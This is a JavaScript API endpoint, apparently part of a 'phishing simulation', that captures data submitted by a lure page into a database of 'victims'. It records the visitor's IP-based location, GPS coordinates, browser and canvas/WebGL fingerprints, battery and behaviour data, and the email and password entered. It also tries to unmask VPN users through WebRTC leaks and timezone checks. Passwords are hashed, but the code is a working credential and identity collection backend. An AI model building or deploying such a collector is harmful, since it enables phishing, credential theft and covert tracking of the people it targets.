/**
 * Capture API Endpoint
 *
 * Receives and stores victim data from phishing simulation
 *
 * POST /api/capture
 */

import bcrypt from 'bcryptjs';
import UAParser from 'ua-parser-js';
import crypto from 'crypto';
import { getVictimsCollection, ensureIndexes } from './_mongodb.js';

// Rate limiting storage (in-memory, resets on cold start)
const rateLimitMap = new Map();
const RATE_LIMIT = 10; // requests per hour
const RATE_WINDOW = 60 * 60 * 1000; // 1 hour in ms

/**
 * Check rate limit for IP
 * @param {string} ip
 * @returns {boolean} true if allowed, false if rate limited
 */
function checkRateLimit(ip) {
  const now = Date.now();
  const key = ip;

  if (!rateLimitMap.has(key)) {
    rateLimitMap.set(key, { count: 1, resetTime: now + RATE_WINDOW });
    return true;
  }

  const limit = rateLimitMap.get(key);

  if (now > limit.resetTime) {
    rateLimitMap.set(key, { count: 1, resetTime: now + RATE_WINDOW });
    return true;
  }

  if (limit.count >= RATE_LIMIT) {
    return false;
  }

  limit.count++;
  return true;
}

/**
 * Get client IP address from request
 * @param {Object} req
 * @returns {string}
 */
function getClientIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

/**
 * Parse User Agent string
 * @param {string} userAgent
 * @returns {Object}
 */
function parseUserAgent(userAgent) {
  const parser = new UAParser(userAgent);
  const result = parser.getResult();

  return {
    browser: {
      name: result.browser.name || 'Unknown',
      version: result.browser.version || 'Unknown',
    },
    os: {
      name: result.os.name || 'Unknown',
      version: result.os.version || 'Unknown',
      platform: result.os.name || 'Unknown',
    },
  };
}

/**
 * Get geolocation from IP address
 * @param {string} ip
 * @returns {Promise<Object>}
 */
async function getLocationFromIP(ip) {
  // Skip for local IPs
  if (ip === 'unknown' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip === '::1' || ip === '127.0.0.1') {
    return {
      ip,
      city: 'Local',
      country: 'XX',
      country_name: 'Local Network',
      region: 'Local',
      timezone: 'UTC',
      latitude: 0,
      longitude: 0,
      isp: 'Local',
      source: 'local',
    };
  }

  try {
    // Try ipapi.co first (1000 requests/day)
    const response = await fetch(`https://ipapi.co/${ip}/json/`);

    if (response.ok) {
      const data = await response.json();
      return {
        ip: data.ip,
        city: data.city || 'Unknown',
        country: data.country_code || 'XX',
        country_name: data.country_name || 'Unknown',
        region: data.region || 'Unknown',
        timezone: data.timezone || 'UTC',
        latitude: data.latitude || 0,
        longitude: data.longitude || 0,
        isp: data.org || 'Unknown',
        postal: data.postal || '',
        source: 'ipapi',
      };
    }

    // Fallback to ip-api.com (no rate limit for non-commercial)
    const fallbackResponse = await fetch(`http://ip-api.com/json/${ip}`);

    if (fallbackResponse.ok) {
      const data = await fallbackResponse.json();
      return {
        ip,
        city: data.city || 'Unknown',
        country: data.countryCode || 'XX',
        country_name: data.country || 'Unknown',
        region: data.regionName || 'Unknown',
        timezone: data.timezone || 'UTC',
        latitude: data.lat || 0,
        longitude: data.lon || 0,
        isp: data.isp || 'Unknown',
        postal: data.zip || '',
        source: 'ip-api',
      };
    }
  } catch (error) {
    console.error('Geolocation error:', error);
  }

  // Return unknown location
  return {
    ip,
    city: 'Unknown',
    country: 'XX',
    country_name: 'Unknown',
    region: 'Unknown',
    timezone: 'UTC',
    latitude: 0,
    longitude: 0,
    isp: 'Unknown',
    source: 'fallback',
  };
}

/**
 * Generate unique fingerprint hash
 * @param {Object} data
 * @returns {string}
 */
function generateFingerprint(data) {
  const fingerprintData = [
    data.browser?.userAgent || '',
    data.screen?.resolution || '',
    data.screen?.colorDepth || '',
    data.device?.platform || '',
    data.timezoneInfo?.timezone || '',
    data.fingerprints?.canvas || '',
    data.fingerprints?.webgl?.renderer || '',
    Date.now().toString(),
  ].join('|');

  return crypto.createHash('sha256').update(fingerprintData).digest('hex');
}

/**
 * Detect VPN usage
 * @param {Object} data
 * @param {Object} location
 * @returns {Object}
 */
function detectVPN(data, location) {
  const detection = {
    timezoneMismatch: false,
    webRTCLeak: false,
    suspiciousISP: false,
    likelyVPN: false,
    confidence: 'low',
  };

  // Check timezone mismatch
  if (data.timezoneInfo?.timezone && location.timezone) {
    detection.timezoneMismatch = data.timezoneInfo.timezone !== location.timezone;
  }

  // Check WebRTC leak
  if (data.webRTC?.publicIP && data.webRTC.publicIP !== location.ip) {
    detection.webRTCLeak = true;
  }

  // Check suspicious ISP
  const vpnKeywords = ['vpn', 'proxy', 'datacenter', 'cloud', 'hosting', 'virtual'];
  const isp = location.isp?.toLowerCase() || '';
  detection.suspiciousISP = vpnKeywords.some((keyword) => isp.includes(keyword));

  // Determine likelihood
  const indicators = [
    detection.timezoneMismatch,
    detection.webRTCLeak,
    detection.suspiciousISP,
  ].filter(Boolean).length;

  if (indicators >= 2) {
    detection.likelyVPN = true;
    detection.confidence = 'high';
  } else if (indicators === 1) {
    detection.confidence = 'medium';
  }

  return detection;
}

/**
 * Main handler
 */
export default async function handler(req, res) {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Get client IP
    const clientIP = getClientIP(req);

    // Check rate limit
    if (!checkRateLimit(clientIP)) {
      return res.status(429).json({
        error: 'Rate limit exceeded',
        message: 'Too many requests. Please try again later.',
      });
    }

    // Parse request body
    const data = req.body;

    // Get location from IP
    const location = await getLocationFromIP(clientIP);

    // Parse user agent
    const parsedUA = parseUserAgent(data.browser?.userAgent || req.headers['user-agent']);

    // Generate fingerprint
    const fingerprint = generateFingerprint(data);

    // Detect VPN
    const vpnDetection = detectVPN(data, location);

    // Hash password (IMPORTANT: Never store plaintext passwords)
    let hashedPassword = null;
    if (data.metadata?.formData?.password) {
      hashedPassword = await bcrypt.hash(data.metadata.formData.password, 10);
    }

    // Prepare victim document
    const victimData = {
      fingerprint,
      timestamp: new Date(),

      screen: data.screen || {},

      browser: {
        ...data.browser,
        ...parsedUA.browser,
      },

      device: {
        ...data.device,
        isBot: /bot|crawler|spider/i.test(data.browser?.userAgent || ''),
      },

      os: parsedUA.os,

      network: {
        ...location,
        vpnDetection,
      },

      timezoneInfo: data.timezoneInfo || {},

      fingerprints: data.fingerprints || {},

      geolocation: data.geolocation || null,

      webRTC: data.webRTC || {},

      behavior: data.behavior || {},

      battery: data.battery || null,

      metadata: {
        userSubmitted: data.metadata?.userSubmitted || false,
        formData: {
          email: data.metadata?.formData?.email || null,
          password: hashedPassword, // Hashed password
        },
      },
    };

    // Save to database (upsert: insert if new, update if exists)
    const collection = await getVictimsCollection();
    await ensureIndexes(collection);

    // Use updateOne with upsert to either insert new or update existing
    const result = await collection.updateOne(
      { fingerprint }, // Find by fingerprint
      { $set: victimData }, // Update with new data
      { upsert: true } // Insert if doesn't exist
    );

    const isUpdate = result.matchedCount > 0;

    // Return success response
    return res.status(200).json({
      success: true,
      message: isUpdate ? 'Data updated successfully' : 'Data captured successfully',
      fingerprint,
      location: {
        city: location.city,
        country: location.country_name,
      },
      vpnDetection,
      isUpdate,
      upsertedId: result.upsertedId,
    });
  } catch (error) {
    console.error('Capture error:', error);

    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
